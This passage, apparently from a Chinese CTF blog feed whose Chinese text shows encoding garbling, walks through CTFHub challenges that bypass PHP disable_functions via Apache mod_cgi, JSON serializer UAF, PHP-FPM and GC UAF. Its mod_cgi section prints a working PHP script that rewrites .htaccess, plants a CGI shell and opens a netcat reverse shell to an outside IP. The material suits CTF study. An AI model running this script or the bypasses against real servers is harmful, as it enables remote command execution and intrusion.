Mod CGI"></a>Apache Mod CGI</h2><p>ä¸»è¦è€ƒå¯Ÿåˆ©ç”¨<code>apache mod_cgi</code>æ¨¡å—ç»“åˆ<code>.htaccess</code>å¯¹functions_disableè¿›è¡Œbypass</p><h3 id="å…³äºåˆ©ç”¨Apache-Mod-CGI-bypass"><a href="#å…³äºåˆ©ç”¨Apache-Mod-CGI-bypass" class="headerlink" title="å…³äºåˆ©ç”¨Apache_Mod_CGI bypass"></a>å…³äºåˆ©ç”¨Apache_Mod_CGI bypass</h3><blockquote><p>åœ¨apacheçš„WEBç¯å¢ƒä¸­ï¼Œç»å¸¸ä¼šä½¿ç”¨<code>.htaccess</code>æ¥ç¡®å®šæŸä¸ªç›®å½•ä¸‹çš„URLé‡å†™è§„åˆ™ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›å¼€æºçš„CMSæˆ–è€…æ¡†æ¶å½“ä¸­ç»å¸¸ä¼šç”¨åˆ°ï¼Œæ¯”å¦‚è‘—åçš„å¼€æºè®ºå›discuz!ï¼Œå°±å¯ä»¥é€šè¿‡.htaccessæ–‡ä»¶å®ç°URLçš„é™æ€åŒ–ï¼Œå¤§éƒ¨åˆ†PHPæ¡†æ¶ï¼Œä¾‹å¦‚ThinkPHPå’ŒLaravelï¼Œåœ¨apacheç¯å¢ƒä¸‹ä¼šç”¨.htaccessæ–‡ä»¶å®ç°è·¯ç”±è§„åˆ™ã€‚ä½†æ˜¯å¦‚æœ.htaccessæ–‡ä»¶è¢«æ”»å‡»è€…ä¿®æ”¹çš„è¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨apacheçš„mod_cgiæ¨¡å—ï¼Œç›´æ¥ç»•è¿‡PHPçš„ä»»ä½•é™åˆ¶ï¼Œæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p></blockquote><h4 id="åˆ©ç”¨æ¡ä»¶-2"><a href="#åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li>1ã€Linux æ“ä½œç³»ç»Ÿ</li><li>2ã€Apache +PHP (apache ä½¿ç”¨<code>apache_mod_php</code>)</li><li>3ã€Apache å¼€å¯äº† <code>cgi</code>, <code>rewrite</code></li><li>4ã€Web ç›®å½•ç»™äº† <code>AllowOverride</code> æƒé™</li></ul><h4 id="bypassæµç¨‹-2"><a href="#bypassæµç¨‹-2" class="headerlink" title="bypassæµç¨‹"></a>bypassæµç¨‹</h4><ul><li>1ã€phpinfoæŸ¥çœ‹æœåŠ¡ç«¯çš„é…ç½®æ˜¯å¦æ”¯æŒ<code>cgi</code></li><li>2ã€é…ç½®<code>.htaccess</code>æ–‡ä»¶å¹¶ä¸Šä¼ </li><li>3ã€ä¸Šä¼ åå¼¹<code>shell</code>çš„æ–‡ä»¶</li></ul><p>é…ç½®.htaccessæ–‡ä»¶å¦‚ä¸‹(å‚è€ƒèšå‰‘ç»™å‡ºçš„ç­–ç•¥)ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure><p>åå¼¹<code>shell</code>æ–‡ä»¶ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">echo&amp;&amp;cd &quot;&#x2F;var&#x2F;www&#x2F;html&quot;;ls -al;echo [S];pwd;echo [E]</span><br><span class="line">&#x2F;&#x2F;æ³¨æ„æ˜¯.antåç¼€</span><br></pre></td></tr></table></figure><p>æœ€åè®¿é—®<code>shell.ant</code>å³å¯è¿›è¡Œåå¼¹shellã€‚</p><p>è¿™é‡Œä¹Ÿå‚è€ƒäº†<a href="https://github.com/l3m0n/Bypass_Disable_functions_Shell">l3m0nå¸ˆå‚…githubé‡Œå…³äºbypassçš„è„šæœ¬</a>ï¼Œè¯¦ç»†å®Œå¤‡ï¼Œå­¦åˆ°å¾ˆå¤šã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"nc -c '/bin/bash' 172.16.15.1 4444"</span>; <span class="comment">//command to be executed</span></span><br><span class="line">$shellfile = <span class="string">"#!/bin/bash\n"</span>; <span class="comment">//using a shellscript</span></span><br><span class="line">$shellfile .= <span class="string">"echo -ne \"Content-Type: text/html\\n\\n\"\n"</span>; <span class="comment">//header is needed, otherwise a 500 error is thrown when there is output</span></span><br><span class="line">$shellfile .= <span class="string">"$cmd"</span>; <span class="comment">//executing $cmd</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEnabled</span><span class="params">($text, $condition, $yes, $no)</span> //<span class="title">this</span> <span class="title">surely</span> <span class="title">can</span> <span class="title">be</span> <span class="title">shorter</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$text: "</span> . ($condition ? $yes : $no) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'checked'</span>])) &#123;</span><br><span class="line">@file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"\nSetEnv HTACCESS on"</span>, FILE_APPEND); <span class="comment">//Append it to a .htaccess file to see whether .htaccess is allowed</span></span><br><span class="line">header(<span class="string">'Location: '</span> . $_SERVER[<span class="string">'PHP_SELF'</span>] . <span class="string">'?checked=true'</span>); <span class="comment">//execute the script again to see if the htaccess test worked</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$modcgi = in_array(<span class="string">'mod_cgi'</span>, apache_get_modules()); <span class="comment">// mod_cgi enabled?</span></span><br><span class="line">$writable = is_writable(<span class="string">'.'</span>); <span class="comment">//current dir writable?</span></span><br><span class="line">$htaccess = !<span class="keyword">empty</span>($_SERVER[<span class="string">'HTACCESS'</span>]); <span class="comment">//htaccess enabled?</span></span><br><span class="line">checkEnabled(<span class="string">"Mod-Cgi enabled"</span>, $modcgi, <span class="string">"Yes"</span>, <span class="string">"No"</span>);</span><br><span class="line">checkEnabled(<span class="string">"Is writable"</span>, $writable, <span class="string">"Yes"</span>, <span class="string">"No"</span>);</span><br><span class="line">checkEnabled(<span class="string">"htaccess working"</span>, $htaccess, <span class="string">"Yes"</span>, <span class="string">"No"</span>);</span><br><span class="line"><span class="keyword">if</span> (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Error. All of the above must be true for the script to work!"</span>; <span class="comment">//abort if not</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">checkEnabled(<span class="string">"Backing up .htaccess"</span>, copy(<span class="string">".htaccess"</span>, <span class="string">".htaccess.bak"</span>), <span class="string">"Suceeded! Saved in .htaccess.bak"</span>, <span class="string">"Failed!"</span>); <span class="comment">//make a backup, cause you never know.</span></span><br><span class="line">checkEnabled(<span class="string">"Write .htaccess file"</span>, file_put_contents(<span class="string">'.htaccess'</span>, <span class="string">"Options +ExecCGI\nAddHandler cgi-script .dizzle"</span>), <span class="string">"Succeeded!"</span>, <span class="string">"Failed!"</span>); <span class="comment">//.dizzle is a nice extension</span></span><br><span class="line">checkEnabled(<span class="string">"Write shell file"</span>, file_put_contents(<span class="string">'shell.dizzle'</span>, $shellfile), <span class="string">"Succeeded!"</span>, <span class="string">"Failed!"</span>); <span class="comment">//write the file</span></span><br><span class="line">checkEnabled(<span class="string">"Chmod 777"</span>, chmod(<span class="string">"shell.dizzle"</span>, <span class="number">0777</span>), <span class="string">"Succeeded!"</span>, <span class="string">"Failed!"</span>); <span class="comment">//rwx</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Executing the script now. Check your listener &lt;img src = 'shell.dizzle' style = 'display:none;'&gt;"</span>; <span class="comment">//call the script</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è§£é¢˜çš„æ—¶å€™å°±æ˜¯ç”¨çš„è¿™ä¸ªè„šæœ¬ã€‚</p><h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®å¸¸è§„æ“ä½œï¼Œèšå‰‘è¿æ¥ï¼Œæ³¨æ„è¿æ¥çš„æ—¶å€™ç¼–ç å™¨éœ€è¦é€‰æ‹©<code>base64</code>ã€‚åŒæ ·æ˜¯ç»ˆç«¯è¾“å…¥å‘½ä»¤æ— æ•ˆã€‚çœ‹ä¸€ä¸‹phpinfoï¼Œå¯ä»¥å‘ç°ï¼Œæ”¯æŒ<code>cgi</code>ï¼ŒåŒæ—¶æ ¹æ®é¢˜ç›®æè¿°ï¼Œåˆ©ç”¨<code>cgi</code>è¿›è¡Œbypassï¼Œè¿˜æ˜¯ä¸¤ç§æ–¹å¼ï¼šèšå‰‘bypassæ’ä»¶ or æ‰‹å·¥bypassã€‚</p><h4 id="åˆ©ç”¨èšå‰‘æ’ä»¶-1"><a href="#åˆ©ç”¨èšå‰‘æ’ä»¶-1" class="headerlink" title="åˆ©ç”¨èšå‰‘æ’ä»¶"></a>åˆ©ç”¨èšå‰‘æ’ä»¶</h4><p>æ¨¡å¼é€‰æ‹©<code>Apache_mod_cgi</code>å³å¯ï¼Œè¯¦ç»†å‚è€ƒ<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/3">è¿™é‡Œ</a>ã€‚</p><h4 id="æ‰‹å·¥bypass-1"><a href="#æ‰‹å·¥bypass-1" class="headerlink" title="æ‰‹å·¥bypass"></a>æ‰‹å·¥bypass</h4><p>å‰é¢è¯´äº†ï¼Œè¿™é¢˜ç”¨çš„l3m0nå¸ˆå‚…çš„è„šæœ¬ï¼Œç›´æ¥å°†<code>exp.php</code>(å‰é¢è´´çš„ä»£ç )ä¸Šä¼ åˆ°webæ–‡ä»¶å¤¹ï¼Œå¹¶è®¿é—®è¯¥æ–‡ä»¶ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub18.png" alt=""></p><p>å†çœ‹èšå‰‘é‡Œçš„æƒ…å†µï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub20.png" alt=""></p><p>å¯ä»¥å‘ç°ï¼Œå¤šäº†å‡ ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­<code>shell.dizzle</code>æ–‡ä»¶é‡ŒåŒ…å«æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ‘ä»¬é€šè¿‡æ›´æ”¹è¯¥æ–‡ä»¶å³å¯æ‹¿åˆ°flag(è¿™é‡Œæ³¨æ„ï¼š<code>/flag</code>æ˜¯644æƒé™ï¼Œ<code>www-data</code>ç”¨æˆ·æ— æ³•é€šè¿‡è¯»æ–‡ä»¶çš„å½¢å¼è¯»åˆ°å†…å®¹, éœ€è¦æ‰§è¡Œæ‹¥æœ‰ SUID æƒé™çš„ <code>tac</code> å‘½ä»¤(å…·ä½“çœ‹ <code>/start.sh</code>)æ¥è·å– flag)ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub19.png" alt=""></p><p>ç„¶ååœ¨æµè§ˆå™¨è®¿é—®<code>shell.dizzle</code>å³å¯æ‹¿åˆ°flagäº†ã€‚</p><p>å¯å‚è€ƒï¼š<br><a href="https://www.anquanke.com/post/id/195686">https://www.anquanke.com/post/id/195686</a></p><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>åˆ©ç”¨Jsonåºåˆ—åŒ–ç¨‹åºä¸­çš„å †æº¢å‡ºè¿›è¡Œbypassã€‚</p><h3 id="å…³äºåˆ©ç”¨Json-Serializer-UAF-bypass"><a href="#å…³äºåˆ©ç”¨Json-Serializer-UAF-bypass" class="headerlink" title="å…³äºåˆ©ç”¨Json_Serializer_UAF bypass"></a>å…³äºåˆ©ç”¨Json_Serializer_UAF bypass</h3><blockquote><p><code>PHP-Json-bypass</code>æ¼æ´åˆ©ç”¨<code>jsonåºåˆ—åŒ–</code>ç¨‹åºä¸­çš„<code>å †æº¢å‡º</code>è§¦å‘ï¼Œä»¥ç»•è¿‡functions_disableå¹¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå½±å“èŒƒå›´æ˜¯<code>Linux</code>ï¼Œ<code>php 7.1-7.3</code>ã€‚</p></blockquote><h4 id="åˆ©ç”¨æ¡ä»¶-3"><a href="#åˆ©ç”¨æ¡ä»¶-3" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li>1ã€Linux æ“ä½œç³»ç»Ÿ</li><li>2ã€PHP ç‰ˆæœ¬ï¼š7.1 - all versions to dateã€7.2 &lt; 7.2.19 (released: 30 May 2019)ã€7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h4 id="bypassæµç¨‹-3"><a href="#bypassæµç¨‹-3" class="headerlink" title="bypassæµç¨‹"></a>bypassæµç¨‹</h4><ul><li>1ã€æŸ¥çœ‹PHPç‰ˆæœ¬</li><li>2ã€ä¸Šä¼ expæ‰§è¡Œæˆ–è€…åˆ©ç”¨èšå‰‘æ’ä»¶bypass</li></ul><p>è¿™é‡Œé™„ä¸€ä¸ªç½‘ä¸Šæ‰¾åˆ°å¤§å¸ˆå‚…å†™çš„<a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">exp</a>ã€‚æˆ‘ä»å¸ˆå‚…é‚£é‡Œä¹Ÿforkäº†expçš„åº“ï¼Œå¯åˆ°æˆ‘çš„githubå…±åŒå­¦ä¹ ã€‚</p><h3 id="è§£é¢˜-3"><a href="#è§£é¢˜-3" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ï¼Œä»ç„¶ç»™äº†å°é©¬ï¼Œè¿æ¥ä¸Šä»ç„¶æ²¡æœ‰æƒé™ã€‚å¯ä»¥é€‰æ‹©åˆ©ç”¨èšå‰‘æ’ä»¶æˆ–è€…ä¸Šé¢çš„expè¿›è¡Œbypassæ‹¿åˆ°<code>www-data</code>çš„ç”¨æˆ·æƒé™ã€‚ï¼ˆå†æç¤ºä¸€ä¸‹ï¼šbypassæ’ä»¶åªæœ‰Linuxä¸‹çš„èšå‰‘å¯ç”¨å“¦ï¼‰</p><h4 id="åˆ©ç”¨èšå‰‘æ’ä»¶-2"><a href="#åˆ©ç”¨èšå‰‘æ’ä»¶-2" class="headerlink" title="åˆ©ç”¨èšå‰‘æ’ä»¶"></a>åˆ©ç”¨èšå‰‘æ’ä»¶</h4><p>å‚è€ƒå®˜æ–¹çš„<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6">wp</a>ï¼Œæˆ‘ä»¬æ¥å®ç°ä¸€ä¸‹ã€‚</p><p>è¿æ¥ä¸Šä¹‹åï¼Œåœ¨ä¸»é¡µé¢é€‰æ‹©<code>ç»•è¿‡disable_functions</code>æ’ä»¶ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub28.png" alt=""></p><p>ç„¶åé€‰æ‹©<code>Json Serializer UAF</code>â€“&gt;å¼€å§‹bypass<br><img src="http://www.ggb0n.cool/images/ctfhub29.png" alt=""></p><p>ä¹‹åå°±èƒ½æ‹¿åˆ°<code>www-data</code>æƒé™çš„shelläº†ï¼Œæ³¨æ„è¿™ä¸ªç”¨æˆ·æƒé™ä¸è¶³ä»¥è¯»å–flagï¼Œå› æ­¤<code>cat</code>å‘½ä»¤è¯»å–ä¸åˆ°flagï¼Œéœ€è¦ç”¨<code>tac</code>å‘½ä»¤æ¥è¯»å–ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub30.png" alt=""></p><h4 id="æ‰‹å·¥bypass-2"><a href="#æ‰‹å·¥bypass-2" class="headerlink" title="æ‰‹å·¥bypass"></a>æ‰‹å·¥bypass</h4><p>expå·²ç»ç»™äº†ï¼Œè‡ªå·±å¯ä»¥å°è¯•ä¸‹ï¼Œè¿™ä¸¤å¤©äº‹æƒ…å¤šï¼Œå‡ ä¸ªé¢˜éƒ½æ˜¯ç”¨èšå‰‘ç§’çš„ã€‚</p><p>å‚è€ƒï¼š<br><a href="https://www.anquanke.com/post/id/195686#h3-4">https://www.anquanke.com/post/id/195686#h3-4</a><br><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/6</a></p><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>åœ¨æœåŠ¡å™¨æ”¯æŒ<code>PHP-FPM</code>çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨PHPçš„å†…æ ¸å˜é‡è¿›è¡Œbypassï¼ŒåŸç†ä¸åˆ©ç”¨LD-PRELOADè¿›è¡Œbypassæ˜¯ä¸€æ ·çš„ã€‚</p><h3 id="å…³äºåˆ©ç”¨PHP-FPM-bypass"><a href="#å…³äºåˆ©ç”¨PHP-FPM-bypass" class="headerlink" title="å…³äºåˆ©ç”¨PHP-FPM bypass"></a>å…³äºåˆ©ç”¨PHP-FPM bypass</h3><blockquote><p><code>Fastcgi</code> æ˜¯ä¸€ç§é€šè®¯åè®®ï¼Œç”¨äºWebæœåŠ¡å™¨ä¸åç«¯è¯­è¨€çš„æ•°æ®äº¤æ¢ï¼›<code>PHP-FPM</code>åˆ™æ˜¯phpç¯å¢ƒä¸­å¯¹<code>Fastcgi</code>åè®®çš„ç®¡ç†ç¨‹åºå®ç°ã€‚</p><p>Nginxä¸ºfastcgi æä¾›äº† fastcgi_param æ¥ä¸»è¦å¤„ç†æ˜ å°„å…³ç³»ï¼Œå°† Nginx ä¸­çš„å˜é‡ç¿»è¯‘æˆ PHP èƒ½å¤Ÿç†è§£çš„å˜é‡ã€‚</p></blockquote><h4 id="åˆ©ç”¨æ¡ä»¶-4"><a href="#åˆ©ç”¨æ¡ä»¶-4" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li>1ã€PHPå¿…é¡»è¿è¡Œäº<code>PHP-FPM/FastCGI</code>æ¨¡å¼ä¸‹</li><li>2ã€å†…æ ¸ç‰ˆæœ¬å¿…é¡»å¤§äº2.98</li><li>3ã€open_basedir = off</li></ul><h4 id="bypassæµç¨‹-4"><a href="#bypassæµç¨‹-4" class="headerlink" title="bypassæµç¨‹"></a>bypassæµç¨‹</h4><ul><li>1ã€æŸ¥çœ‹phpinfoæ˜¯å¦æ”¯æŒ<code>PHP-FPM/FastCGI</code></li><li>2ã€ä¸Šèšå‰‘æ’ä»¶ or exp</li></ul><h3 id="è§£é¢˜-4"><a href="#è§£é¢˜-4" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ï¼Œä¸€å¦‚æ—¢å¾€èšå‰‘è¿æ¥ï¼Œè¿™ä¸ªé¢˜å…¶å®ä¸èšå‰‘åŸç‰ˆæœ‰ç‚¹å‡ºå…¥ï¼Œèšå‰‘é¢˜è§£é‡Œå†™çš„æœ¬é¢˜ç¯å¢ƒæ˜¯æ”¯æŒ<code>putenv</code>çš„ï¼Œé‚£å°±å’Œåˆ©ç”¨LD_PRELOADç»•è¿‡å§¿åŠ¿ä¸€æ ·äº†ï¼Œä½†æ˜¯è¯•äº†ï¼Œæ²¡æˆåŠŸï¼Œåæ¥ç”¨èšå‰‘æ’ä»¶çš„æ—¶å€™å‘ç°äº†é—®é¢˜ã€‚</p><h4 id="åˆ©ç”¨èšå‰‘æ’ä»¶-3"><a href="#åˆ©ç”¨èšå‰‘æ’ä»¶-3" class="headerlink" title="åˆ©ç”¨èšå‰‘æ’ä»¶"></a>åˆ©ç”¨èšå‰‘æ’ä»¶</h4><p>åƒå‰é¢çš„æ“ä½œä¸€æ ·ï¼šé€‰æ‹©ä¸Šbypassæ’ä»¶ -&gt; é€‰æ‹©æ¨¡å¼ -&gt; FPM/FCGI<br>è¿™ä¸ªæ—¶å€™å‘ç°é—®é¢˜æ‰€åœ¨äº†ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub22.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ¬é¢˜ç¯å¢ƒå¹¶æ²¡æœ‰<code>putenv</code>ï¼Œç”¨LD_PRELOADçš„å§¿åŠ¿èƒ½è¿‡å°±æ€ªäº†â€¦</p><p>ç„¶ååœ¨åœ°å€é‡Œé€‰ä¸Šæœ€åä¸€ä¸ªå¹¶å¼€å§‹ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub24.png" alt=""></p><p>æˆåŠŸæ‰§è¡Œä¹‹åï¼Œè¿æ¥ä¸Šé¢˜ç›®ç¯å¢ƒï¼Œå†åˆ·æ–°ä¸€ä¸‹webç›®å½•çœ‹ä¸€ä¸‹ï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub23.png" alt=""></p><p>å‘ç°å¤šäº†ä¸€ä¸ª<code>.antproxy.php</code>æ²¡é”™ï¼è¿™å°±æ˜¯èšå‰‘å†™å…¥çš„å¦ä¸€ä¸ªshellæ–‡ä»¶ï¼Œæˆ‘ä»¬å›å»æŠŠè¿æ¥shellçš„urlæ¢æˆè¿™ä¸ªshellæ–‡ä»¶çš„urlï¼Œé“¾æ¥å¯†ç ä¸å˜ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">urlï¼šhttp://change-<span class="number">123456</span>/<span class="keyword">shell</span>.<span class="bash">phpï¼Œè¿æ¥å¯†ç ï¼šcmd</span></span><br><span class="line">æ”¹ä¸º</span><br><span class="line">urlï¼šhttp://change-<span class="number">123456</span>/.antproxy.phpï¼Œè¿æ¥å¯†ç ï¼š<span class="keyword">cmd</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/ctfhub25.png" alt=""></p><p>å†æ¬¡è¿æ¥å³å¯æ‹¿åˆ°æ‹¥æœ‰<code>www-data</code>æƒé™çš„shellï¼Œæ³¨æ„æ­¤æ—¶<code>cat</code>å‘½ä»¤è¿˜æ˜¯è¯»å–ä¸åˆ°flagçš„ï¼Œéœ€è¦ç”¨<code>tac</code>å‘½ä»¤æ¥æ‹¿åˆ°flag:<br><img src="http://www.ggb0n.cool/images/ctfhub27.png" alt=""></p><p>å‚è€ƒï¼š<br><a href="https://www.freebuf.com/articles/web/82801.html">https://www.freebuf.com/articles/web/82801.html</a><br><a href="https://www.anquanke.com/post/id/195686#h3-4">https://www.anquanke.com/post/id/195686#h3-4</a></p><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>åˆ©ç”¨<code>GC UAF</code>å¯¼è‡´çš„PHPä»£ç æ‰§è¡Œæ¼æ´è¿›è¡Œbypass</p><h3 id="å…³äºåˆ©ç”¨GC-UAF"><a href="#å…³äºåˆ©ç”¨GC-UAF" class="headerlink" title="å…³äºåˆ©ç”¨GC UAF"></a>å…³äºåˆ©ç”¨GC UAF</h3><blockquote><p>PHPæ˜¯ä¸€é—¨æ‰˜ç®¡å‹è¯­è¨€ï¼Œåœ¨PHPç¼–ç¨‹ä¸­ç¨‹åºå‘˜ä¸éœ€è¦æ‰‹å·¥å¤„ç†å†…å­˜èµ„æºçš„åˆ†é…ä¸é‡Šæ”¾(ä½¿ç”¨Cç¼–å†™PHPæˆ–Zendæ‰©å±•é™¤å¤–)ï¼Œè¿™å°±æ„å‘³ç€PHPæœ¬èº«å®ç°äº†åƒåœ¾å›æ”¶æœºåˆ¶(Garbage Collection)ã€‚</p><p>è¯¥æœºåˆ¶å­˜åœ¨UAFæ¼æ´ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥æ‰§è¡Œå‘½ä»¤ç­‰ï¼Œä¹Ÿå¯ä»¥å®Œæˆå¯¹functions_disableçš„bypass</p></blockquote><h4 id="åˆ©ç”¨æ¡ä»¶-5"><a href="#åˆ©ç”¨æ¡ä»¶-5" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><ul><li><p>PHPç‰ˆæœ¬æ»¡è¶³ï¼š</p><p>7.0 - all versions to date</p><p>7.1 - all versions to date</p><p>7.2 - all versions to date</p><p>7.3 - all versions to date</p></li></ul><h4 id="bypassæµç¨‹-5"><a href="#bypassæµç¨‹-5" class="headerlink" title="bypassæµç¨‹"></a>bypassæµç¨‹</h4><ul><li>1ã€æŸ¥çœ‹PHPç‰ˆæœ¬ä¿¡æ¯</li><li>2ã€åˆ©ç”¨èšå‰‘æ’ä»¶ or exp</li></ul><h3 id="è§£é¢˜-5"><a href="#è§£é¢˜-5" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ï¼Œèšå‰‘è¿æ¥ï¼ŒæŸ¥çœ‹phpinfoå‘ç°æ»¡è¶³è¦æ±‚ï¼Œé‚£ä¹ˆå³å¯åˆ©ç”¨è¯¥æ–¹å¼è¿›è¡Œbypass</p><h4 id="åˆ©ç”¨èšå‰‘æ’ä»¶-4"><a href="#åˆ©ç”¨èšå‰‘æ’ä»¶-4" class="headerlink" title="åˆ©ç”¨èšå‰‘æ’ä»¶"></a>åˆ©ç”¨èšå‰‘æ’ä»¶</h4><p>èšå‰‘è¿æ¥ä¹‹åï¼Œé€‰æ‹©ä¸Šbypassæ’ä»¶ -&gt; é€‰æ‹©æ¨¡å¼ -&gt; GC UAF<br><img src="http://www.ggb0n.cool/images/ctfhub31.png" alt=""></p><p>ç„¶åç‚¹å‡»å¼€å§‹ï¼Œå³å¯æ‹¿åˆ°<code>www-data</code>æƒé™çš„shellï¼Œåˆ©ç”¨<code>tac</code>å‘½ä»¤å³å¯è¯»åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/ctfhub32.png" alt=""></p><h4 id="æ‰‹å·¥bypass-3"><a href="#æ‰‹å·¥bypass-3" class="headerlink" title="æ‰‹å·¥bypass"></a>æ‰‹å·¥bypass</h4><p>å¯ä»¥åˆ©ç”¨è¿™ä¸ª<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">exp</a>è¿›è¡Œ</p><p>å‚è€ƒï¼š<br><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7</a><br><a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p><strong>æŒç»­æ›´æ–°ã€‚ã€‚ã€‚</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸å¾—ä¸è¯´ï¼ŒLineå¸ˆå‚…ä»¬åœ¨æŠ€èƒ½æ ‘é‡Œå®‰æ’çš„è¿™ä¸ªåˆ†æ”¯çœŸæ˜¯å¤ªæ£’äº†ï¼ä½œä¸ºä¸€åèœé¸¡ï¼Œä¹‹å‰åªæ˜¯å¯¹&lt;code&gt;bypass functions_disable&lt;/code&gt;æœ‰æ¯”è¾ƒå°‘å¹¶ä¸”ä¸æ¸…æ™°çš„ç†è§£ï¼Œä½†æ˜¯åˆ·äº†è¿™éƒ¨åˆ†é¢˜ç›¸å½“äºç³»ç»Ÿåœ°å­¦ä¹ äº†ä¸€éï¼Œå¸®åŠ©å¾ˆå¤§ï¼
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="webå®‰å…¨" scheme="http://ggb0n.cool/categories/CTF/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="CTFHubåˆ·é¢˜" scheme="http://ggb0n.cool/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="èšå‰‘" scheme="http://ggb0n.cool/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>GWCTF2019å¤ç°</title>
    <link href="http://ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/03/04/GWCTF2019%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-03-04T13:48:34.000Z</published>
    <updated>2020-05-13T03:14:10.039Z</updated>
    
